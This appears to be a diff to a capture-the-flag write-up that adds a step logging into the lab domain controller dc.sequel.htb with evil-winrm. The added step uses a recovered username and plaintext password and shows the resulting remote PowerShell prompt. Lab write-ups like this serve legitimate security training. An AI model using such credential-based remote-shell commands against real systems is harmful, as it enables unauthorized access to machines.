@@ -298,6 +298,18 @@ This user also has access via winrm
 
 ## Shell access as `sql_svc`
 ```python
-
+evil-winrm -i dc.sequel.htb -u sql_svc -p REGGIE1234ronnie
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sql_svc\Documents>
 ```
+Shell access!
+
+
 
